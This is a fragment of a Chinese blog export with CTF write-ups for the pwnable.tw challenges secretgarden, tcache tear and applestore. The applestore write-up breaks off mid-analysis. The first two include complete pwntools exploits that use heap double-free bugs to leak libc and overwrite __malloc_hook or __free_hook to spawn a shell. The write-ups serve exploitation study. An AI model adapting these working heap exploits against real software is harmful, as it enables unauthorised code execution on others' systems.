SecretGarden","url":"/2020/03/20/SecretGarden/","content":"\n[题目链接](https://pwnable.tw/challenge/#12)\n\n参考WP：\n\n[pwnable.tw中的secretgarden](https://www.lyyl.online/2019/09/27/pwnable-tw中的secretgarden/)\n\n[pwnable.tw 11~18题 writeup](https://veritas501.space/2018/03/04/pwnable.tw 11~18题 writeup/)\n\n[pwnable.tw-secretgarden](https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/)\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n两条命令查看给定二进制文件基本信息：\n\n```shell\n$ file secretgarden \nsecretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped\n\n$ checksec secretgarden \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/bling/.pwntools-cache-2.7/update to 'never'.\n[*] You have the latest version of Pwntools (4.0.1)\n[*] '/mnt/hgfs/vmshare-1604/secret_gargen/secretgarden'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n```\n\n以上信息可以得知：\n\n- 64位二进制可执行程序，动态链接，去符号表\n- got表不可写\n- 栈不可执行，开启栈canary\n- 地址随机化开启\n\n## 1.2 IDA逆向源码逻辑\n\n第一眼就看到了alarm函数，patch掉。\n\n```c\nvoid __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 choice_1; // [rsp+0h] [rbp-28h]\n  unsigned __int64 v4; // [rsp+8h] [rbp-20h]\n\n  v4 = __readfsqword(0x28u);\n  time_alarm();\n  while ( 1 )\n  {\n    print_info();\n    read(0, &choice_1, 4uLL);\n    switch ( (unsigned int)strtol((const char *)&choice_1, 0LL, 10) )\n    {\n      case 1u:\n        raise();                                // Raise a flower\n        break;\n      case 2u:\n        visit();                                // Visit the garden\n        break;\n      case 3u:\n        remove();                               // Remove a flower from the garden\n        break;\n      case 4u:\n        clean();                                // Clean the garden\n        break;\n      case 5u:\n        puts(\"See you next time.\");             // Leave the garden\n        exit(0);\n        return;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n}\n```\n\n源码一共实现了5个功能，分别是raise()，visit()，remove()， clean()，以及一个exit(0)退出函数。着重分析前三个函数功能。\n\n- raise()函数\n\n经过分析，raise()的功能主要是malloc一个堆块（flower_chunk），并将该堆块链接到bss段qword_202040（大小为100的数组），一共可以养100支花。如下图所示。\n\n![](secretgarden1.png)\n\n- visit()函数\n\n该函数会遍历bss段上全局变量qword_202040[100]中各个元素，并打印flower_chunk第一个元素为1的堆块内容（flower_chunk的第一个元素为1表明该flower处于raise状态，当remove后第一个元素会变为0）。\n\n- remove()函数\n\n该函数根据指定的数组下标，将对应的flower_chunk第一个元素置为0，并将第二个元素指向的堆块free掉。其中free代码如下：\n\n```c\nif ( v2 <= 99 && (v1 = (_DWORD *)qword_202040[v2]) != 0LL )\n  {\n    *v1 = 0;\n    free(*(void **)(qword_202040[v2] + 8LL));\n    result = puts(\"Successful\");\n  }\n```\n\n可以看到，本题的漏洞点就在这儿。free操作后，并没有将flower_chunk的第二个元素置NULL，导致一个悬空指针的产生。\n\n- clean()函数\n\n对delete过的节点，将其从bss段的qword_202040[100]中释放，并将qword_202040[100]相应元素置0。这个函数在我利用中没有用到。\n\n## 1.3 漏洞触发\n\n以double free的方式触发该漏洞，代码如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('40','f0','c0')\nRaise('40','f1','c1')\nRemove('0')\nRemove('0')\nmyproc.interactive()\n```\n\n执行后，出现如下错误提示信息：\n\n```shell\n[DEBUG] Received 0x5b bytes:\n    \"*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\\n\"\n*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\n```\n\n# 2 利用\n\n本题有一个double free的漏洞，并且有一个visit()函数可以打印flower_chunk的堆块内容。因此可以将libc中的某个地址泄露到flower_chunk堆块中，调用visit()函数进行打印，最后通过偏移计算libc基址。double free还可用于构造任意地址写，寻找合适的函数指针（如程序自带的函数指针，got表项，fini_array段函数指针或者libc中的函数指针）将其覆盖为system函数（并构造参数\"/bin/sh\\x00\"），或者直接调用one_gadget。\n\n- 泄露libc地址\n\n利用unsorted bin的特性。释放一个堆块到unsorted bin，然后又申请该大小的堆块，调用visit()打印flower_chunk中的name堆块其前0-8或8-16字节。\n\n在覆盖0-8字节时有两种办法：\n\n1）使用` sendline(\"a\"*7) `或`send(\"a\"*8) `\n\n2）使用`send(\"\")`\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# 必须保证输入的name加上字符串结尾符正好是8个字节,这样才能泄露出后8个字节的地址\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# 使用给定的libc_64.so.6,在调试时可以算出top_addr和libc_addr之间的差值为0x3C3B78\nlog.warn(\"top_addr:0x%x\" % top_addr)\nlog.warn(\"libc_addr:0x%x\" % libc_addr)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n- 覆盖函数指针\n\n经过分析，本题采用覆盖`libc函数指针+one_gadget`的方式进行利用。直接覆盖malloc函数的方式不可行，因为one_gadget都有constraints约束条件，如下代码所示。\n\n```shell\n$ one_gadget libc_64.so.6 \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xef6c4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf0567 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n堆里面有一种情况，就是free或者malloc出错时，会去调用`malloc_printerr`打印错误信息（如检测到double free时）。这个函数中会去调用malloc，此时的rsp+0x50可以满足上述约束条件。\n\n参考[gdb带源码调试libc](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/20/gdb/)方法获取执行到`__malloc_hook`时的约束条件。\n\n因此，选择将`__malloc_hook`函数指针覆盖为one_gadget地址。最后触发一次double free，进入`malloc_printerr`中调用`malloc`函数时会先执行`__malloc_hook`，于是one_gadget得到执行，成功get shell。\n\n# 3 EXP\n\n最终的exp如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# 必须保证输入的name加上字符串结尾符正好是8个字节,这样才能泄露出后8个字节的地址\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# 使用给定的libc_64.so.6,在调试时可以算出top_addr和libc_addr之间的差值为0x3C3B78\n# log.warn(\"top_addr:0x%x\" % top_addr)\n# log.warn(\"libc_addr:0x%x\" % libc_addr)\n\nmalloc_hook = libc_addr + mylibc.symbols['__malloc_hook']\nfake_chunk = malloc_hook - 0x23\n# 根据__malloc_hook低地址的情况，__malloc_hook - 0x13处可以构造8字节0x000000000000007f作为fake_chunk的大小，此时fake_chunk的地址为__malloc_hook - 0x13 - 0x10\ngadget_addr = libc_addr + 0xf0567\n\nRaise('100','f0','c4')\nRaise('100','f1','c5')\nRemove('4')\nRemove('5')\nRemove('4')\nRaise('100',p64(fake_chunk),'c6')\nRaise('100','xx','c7')\nRaise('100','xx','c8')\nlog.warn('fake_chunk: 0x%x' % fake_chunk)\nlog.warn('malloc_hook: 0x%x' % malloc_hook)\nlog.warn('libc_addr: 0x%x' % libc_addr)\nlog.warn('gadget_addr: 0x%x' % gadget_addr)\n# hacked fastbin to fake_chunk\nRaise('100','a'*0x13 + p64(gadget_addr),'c9')\n# size 0x70 104\n# size 0x60 88\nRemove('8')\nRemove('8')\n#Visit()\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n","categories":["CTF"]},{"title":"pwnable.tw 之 tcache tear","url":"/2020/03/13/tcachetear/","content":"\n[Tcache tear题目链接](https://pwnable.tw/challenge/#33)\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file tcache_tear\ntcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped\n\n$ checksec tcache_tear\n[*] '/mnt/hgfs/vmshare-1804/Tcache-tear/tcache_tear'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n```\n\n可以得到如下信息：\n\n- 64位二进制程序，动态链接，去符号表\n- got表保护开启，got表不可写\n- 栈保护开启，栈不可执行，且有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain中sub_400948()存在一个alarm定时函数，于是将它patch掉。（Edit --> Patch program -->Assemble，全部patch为nop）\n\n通过IDA分析Tcache tear的源码逻辑如下：\n\n![](tcachetear1.png)\n\n这里的漏洞点在num = 2的分支中，如下代码：\n\n```c\n if ( v4 <= 7 )\n      {\n        free(ptr);\n        ++v4;\n      }\n// free了全局变量ptr指向的堆内存，但并没有将该指针置NULL，导致悬空指针的产生。\n```\n\n本题采用的glibc 2.26 (ubuntu 17.10) 版本，为提升堆管理性能，舍弃了很多安全检查。如，对tcache而言，可以不间隔地free两个相同的堆，并添加到tcache链表中。\n\n本题中，控制Malloc的size在tcache范围内，执行如下命令可形成一个环：\n\n```c\nMalloc(size,data);\nfree();\nfree();\n```\n\n![](tcachetear2.png)\n\n下次malloc时，tcache将最右边的chunk返回给用户使用，用户可以更改其中的数据，如chunk的fd部分。那么当再一次malloc时，将右数第二个chunk（跟上一个实际是同一chunk）分配给用户。但此时由于fd被更改，下一次mallloc时，就会分配到fd中指定的地址。因此我们便可以在新地址中写一些数据，达到任意地址写的目的。\n\n接下来，我们触发一下这个漏洞试试，定个小目标，去修改全局变量0x602060处Global_name的值。\n\n\n\n## 1.3 漏洞触发 - 任意地址写\n\n初始化时，Global_name赋值为xiayuan，我的目标是把它改成wangyuxuan，代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(p64(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.send('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.send('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.send('4')\n    \n# Global_name --> xiayuan\nmyproc.recvuntil('Name:')\nmyproc.sendline('xiayuan')\n\n# change Global_name --> wangyuxuan\nmy_malloc(200,'aaaaaaaaaa')\nmy_free()\nmy_free()\nmy_malloc(200,p64(0x602060))\nmy_malloc(200,'0')\nmy_malloc(200,'wangyuxuan')\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\ngdb中查看Global_name处的值，成功被改\n\n```shell\ngef➤  x/s 0x602060\n0x602060:\t\"wangyuxuan\"\n```\n\n# 2 漏洞利用\n\n得到一个任意地址写的漏洞，我们通常有一下几种方式利用：\n\n- 修改函数指针\n- 修改got表\n- fini_array段函数指针\n- libc中的函数指针\n\n在本题中：\n\n- 程序没有自己的函数指针\n- got表不可写\n- 进入main函数后，一直处于while循环，不会执行到fini_array\n\n因此，我们只能去修改libc中的函数指针，需要：\n\n- 泄露libc基址\n- 利用libc中的函数指针\n\n## 2.1 泄露libc基址\n\n参考hacknote中，unsorted bin的特性。这里需要构造一个会被回收到unsorted bin中的chunk，然后将chunk中相应位置的数据（main_arena的top结构体）读出，减去它跟libc基址的偏移，就可以得到libc基址。\n\n一个又能被我们写，又能被我们读的位置，就是Global_name处。\n\nfree时除了检查当前块，还要检查nextchunk和nextchunk的nextchunk。因此总共需要构造三个块。\n\n大小分别为0x500（free时进入usorted bin）, 0x20, 0x20。且需要将他们的inuse位置1，以通过检查。\n\n- main_arena中top结构体距离libc基址的偏移：0x00007f762418fca0 - 0x00007f7623da4000 = 0x3ebca0\n\n![](tcachetear3.png)\n\n泄露libc地址的源码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recv('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\n\n\n## 2.2 控制libc中的函数指针\n\nlibc中存在一些导出的hook函数指针：\n\n```shell\n$ strings libc-123.so | grep hook\n__malloc_initialize_hook\n_dl_open_hook\nargp_program_version_hook\n__after_morecore_hook\n__memalign_hook\n__malloc_hook\n__free_hook\n_dl_open_hook2\n__realloc_hook\n```\n\n[malloc hook初探](https://www.jianshu.com/p/0d7aa3166eec)\n\n根据这些hook函数的特性（malloc之前会调用`__malloc_hook`，free之前会调用`__free_hook`），我们可以劫持这些函数指针，来执行system函数或者one_gadget。\n\n```shell\n$ one_gadget libc-123.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 3 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmylibc = ELF('libc-123.so')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recvuntil('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\n# hijack __free_hook\nfree_hook = libc_addr + mylibc.symbols['__free_hook']\nsystem_addr = libc_addr + mylibc.symbols['system']\n# 1、将free_hook所在地址的值覆盖为system函数的地址值\nmy_malloc(0x90,'b')\nmy_free()\nmy_free()\nmy_malloc(0x90,p64(free_hook))\nmy_malloc(0x90,'0')\nmy_malloc(0x90,p64(system_addr))\n# 2、使void *ptr指向“/bin/sh”，后续free(ptr)时相当于执行system(\"/bin/sh\")\nmy_malloc(0x80,'/bin/sh\\x00')\n\nmy_free()\n# gdb.attach(myproc,'b * 0x00400c02 \\nc')\nmyproc.interactive()\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["heap","tcache"],"categories":["CTF"]},{"title":"pwnable.tw 之 applestore","url":"/2020/03/07/applestore/","content":"\n[applestore题目链接](https://pwnable.tw/challenge/#7)\n\n这是一道我看着看着想哭的题目，真的太绕了。\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file applestore\napplestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped\n\n$ checksec applestore\n[*] '/mnt/hgfs/vmshare/applestore/applestore'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n可以得到如下信息：\n\n- 32位二进制程序，动态链接，没有去符号表\n- got表可写\n- 开启栈不可执行，并有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain函数中，前两个函数时设置超时的，60秒程序就timeout了。\n\n- memset将全局变量mycart的16个字节全部初始化为0。\n- menu函数中做一些信息打印。从代码中可以看到，有6个选项。\n- handler函数中会进行一些处理。其中handler函数是重点，接下来我们对其中的每个函数详细分析。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  signal(14, timeout);\n  alarm(0x3Cu);\n  memset(&myCart, 0, 0x10u);\n  menu();\n  return handler();\n}\n\nint menu()\n{\n  puts(\"=== Menu ===\");\n  printf(\"%d: Apple Store\\n\", 1);\n  printf(\"%d: Add into your shopping cart\\n\", 2);\n  printf(\"%d: Remove from your shopping cart\\n\", 3);\n  printf(\"%d: List your shopping cart\\n\", 4);\n  printf(\"%d: Checkout\\n\", 5);\n  return printf(\"%d: Exit\\n\", 6);\n}\n\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    {\n      case 1:\n        list();                                 // apple store\n        break;\n      case 2:\n        add();                                  // Add into your shopping cart\n        break;\n      case 3:\n        delete();                               // Remove from your shopping cart\n        break;\n      case 4:\n        cart();                                 // List your shopping cart\n        break;\n      case 5:\n        checkout();                             // Checkout\n        break;\n      case 6:\n        puts(\"Thank You for Your Purchase!\");   // Exit\n        return __readgsdword(0x14u) ^ v2;\n      default:\n        puts(\"It's not a choice! Idiot.\");\n        break;\n    }\n  }\n}\n```\n\n### 1.2.1 list\n\n这个函数没什么好关注的，就是很多条打印信息，将苹果商店里有的商品及价格展示给我们。\n\n```c\nint list()\n{\n  puts(\"=== Device List ===\");\n  printf(\"%d: iPhone 6 - $%d\\n\", 1, 199);\n  printf(\"%d: iPhone 6 Plus - $%d\\n\", 2, 299);\n  printf(\"%d: iPad Air 2 - $%d\\n\", 3, 499);\n  printf(\"%d: iPad Mini 3 - $%d\\n\", 4, 399);\n  return printf(\"%d: iPod Touch - $%d\\n\", 5, 199);\n}\n```\n\n### 1.2.2 add\n\nadd函数的主要逻辑是将我们选择的商品添加进购物车。此函数看上去比较多，涉及5个case分支。实际只需关注create和insert两个函数功能。\n\n```c\nunsigned int add()\n{\n  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v3; // [esp+3Ch] [ebp-Ch]\n\n  v3 = __readgsdword(0x14u);\n  printf(\"Device Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  switch ( atoi(&nptr) )\n  {\n    case 1:\n      v1 = (_DWORD *)create(\"iPhone 6\", 199);\n      insert(v1);\n      goto LABEL_8;\n    case 2:\n      v1 = (_DWORD *)create(\"iPhone 6 Plus\", 299);\n      insert(v1);\n      goto LABEL_8;\n    case 3:\n      v1 = (_DWORD *)create(\"iPad Air 2\", 499);\n      insert(v1);\n      goto LABEL_8;\n    case 4:\n      v1 = (_DWORD *)create(\"iPad Mini 3\", 399);\n      insert(v1);\n      goto LABEL_8;\n    case 5:\n      v1 = (_DWORD *)create(\"iPod Touch\", 199);\n      insert(v1);\nLABEL_8:\n      printf(\"You've put *%s* in your shopping cart.\\n\", *v1);\n      puts(\"Brilliant! That's an amazing idea.\");\n      break;\n    default:\n      puts(\"Stop doing that. Idiot!\");\n      break;\n  }\n  return __readgsdword(0x14u) ^ v3;\n}\n```\n\n#### 1.2.2.1 create\n\ncreate函数中申请一个16字节大小的堆，并将该堆块分成4份。第0~3字节存放asprintf申请的堆空间地址（该新申请的堆中存放的是手机型号的字符串）。第4~7字节存放手机的价格。剩余8个字节目前存放的是0。随后将这个堆块的地址返回给上一层，上一层将该地址传递给insert。\n\n```c\nchar **__cdecl create(int p_type, char *p_money)\n{\n  char **v2; // eax MAPDST\n\n  v2 = (char **)malloc(0x10u);\n  v2[1] = p_money;\n  asprintf(v2, \"%s\", p_type);\n  v2[2] = 0;\n  v2[3] = 0;\n  return v2;\n}\n```\n\ncreate的堆块和asprintf生成的堆块关系如下图：\n\n![](applestore-1.png)\n\n#### 1.2.2.2 insert\n\ninsert函数中，将上一步的堆块和全局变量mycart连接起来，组成如下图1.2.2.2-1的关系。\n\n```c\nint *__cdecl insert(int *info_loc)\n{\n  int *result; // eax\n  _DWORD *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )\n    ;\n  i[2] = info_loc;\n  result = info_loc;\n  info_loc[3] = (int)i;\n  return result;\n}\n```\n\n图1.2.2.2-1\n\n![](applestore-2.png)\n\n当add第二部手机进购物车的时候，就会生成如图1.2.2.2-2的关系：\n\n![](applestore-3.png)\n\n可以看出，添加进购物车的手机信息都被串成了双链表的形式。因此后续的delete和cart就是双链表删除和遍历的操作。\n\n### 1.2.3 delete\n\ndelete函数的功能主要是，根据我们输入的编号，将购物车中对应的商品删除。\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  _DWORD *v2; // [esp+14h] [ebp-34h]\n  int v3; // [esp+18h] [ebp-30h]\n  int v4; // [esp+1Ch] [ebp-2Ch]\n  int v5; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (_DWORD *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  v3 = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == v3 )\n    {\n      v4 = v2[2];\n      v5 = v2[3];\n      if ( v5 )\n        *(_DWORD *)(v5 + 8) = v4;\n      if ( v4 )\n        *(_DWORD *)(v4 + 12) = v5;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *v2);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (_DWORD *)v2[2];\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\n### 1.2.4 cart\n\ncart函数的功能是打印我们购物车中已经存在的商品，并且计算购物车中商品的总额，最后将总额返回。\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int v3; // [esp+1Ch] [ebp-2Ch]\n  _DWORD *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  v3 = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, *i, i[1]);\n      v3 += i[1];\n    }\n  }\n  return v3;\n}\n```\n\n### 1.2.5 checkout\n\ncheckout函数，顾名思义，就是结账的地方。不过这里不管你买多少，都只会输出让你下次再结账的提示。\n\n不过我们可以看到，这里有个if分支。当cart的返回值（购物总价值）为7174美元时，就会弹出一个\"一美元买iphone 8\"的提示。并且调用了asprintf和insert两个函数，将一美元的iphone加入购物车列表中，最后将购物车总价值改为7175.\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert(&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n这里有一个很奇怪的点，跟add函数中添加一部手机的操作不一样。\n\n- 